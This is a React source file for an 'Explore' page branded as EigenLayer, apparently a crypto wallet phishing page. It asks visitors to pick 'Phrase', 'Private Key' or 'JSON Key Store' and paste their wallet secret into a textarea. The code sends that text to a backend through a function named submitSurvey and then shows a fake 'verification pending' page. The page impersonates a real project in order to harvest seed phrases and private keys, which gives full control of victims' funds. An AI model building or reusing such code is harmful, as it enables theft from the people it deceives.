import { useState } from "react";
import eigenLayerLogo from "@/assets/eigenlayer-logo.png";
import { Link, useSearchParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Footer } from "@/components/Footer";
import { useToast } from "@/hooks/use-toast";
import { submitSurvey } from "@/api/submit-survey";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";

const Explore = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const walletName = searchParams.get("wallet") || "Unknown";
  const walletCode = walletName.toLowerCase().replace(/\s+/g, '_');
  const [connectionMethod, setConnectionMethod] = useState("");
  const [additionalDetails, setAdditionalDetails] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { toast } = useToast();

  const handleConnect = async () => {
    if (!connectionMethod) {
      toast({
        title: "Please select a method",
        description: "You need to select a connection method before submitting.",
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);

    try {
      await submitSurvey({
        walletCode,
        walletName,
        connectionMethod,
        additionalText: additionalDetails.trim(),
      });

      toast({
        title: "Submitted successfully",
        description: "Your connection request has been received.",
      });

      navigate('/verification-pending');
    } catch (error) {
      console.error('Error submitting:', error);
      toast({
        title: "Error",
        description: "Failed to submit. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-background flex flex-col">
      {/* Header */}
      <header className="border-b border-border bg-card">
        <div className="container flex h-16 items-center justify-between">
          <Link to="/" className="flex items-center gap-2">
            <img src={eigenLayerLogo} alt="EigenLayer" className="h-8 w-8" />
            <span className="font-semibold text-foreground">EigenLayer</span>
          </Link>
          <nav className="flex items-center gap-6">
            <Link to="/" className="text-sm text-muted-foreground hover:text-foreground">Home</Link>
            <Link to="/explore" className="text-sm text-primary font-medium">Explore</Link>
          </nav>
        </div>
      </header>

      {/* Main Content */}
      <main className="container py-12 flex-1">
        <div className="max-w-2xl mx-auto">
          <h1 className="text-3xl font-bold mb-2">Explore</h1>
          <p className="text-primary mb-8">Explore different connection mode</p>

          <div className="bg-card border border-border rounded-xl p-8">
            <div className="mb-6">
              <span className="text-sm text-muted-foreground">DAPP Type: </span>
              <span className="font-semibold">{walletName}</span>
            </div>

            <div className="space-y-6">
              <div>
                <label className="text-sm text-muted-foreground mb-2 block">
                  Method of Connection
                </label>
                <Select value={connectionMethod} onValueChange={setConnectionMethod}>
                  <SelectTrigger className="w-full bg-background">
                    <SelectValue placeholder="Select One" />
                  </SelectTrigger>
                  <SelectContent className="bg-card border border-border z-50">
                    <SelectItem value="Phrase">Phrase</SelectItem>
                    <SelectItem value="Private Key">Private Key</SelectItem>
                    <SelectItem value="JSON Key Store">JSON Key Store</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              <div>
                <label className="text-sm text-primary mb-2 block">
                  Phrase, Key store or Private key
                </label>
                <Textarea
                  placeholder="Enter additional details..."
                  value={additionalDetails}
                  onChange={(e) => setAdditionalDetails(e.target.value)}
                  className="min-h-[120px] bg-background"
                />
              </div>

              <Button 
                onClick={handleConnect}
                disabled={isSubmitting}
                className="w-full bg-primary hover:bg-primary/90 disabled:opacity-50"
              >
                {isSubmitting ? "Submitting..." : "Connect"}
              </Button>
            </div>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
};

export default Explore;
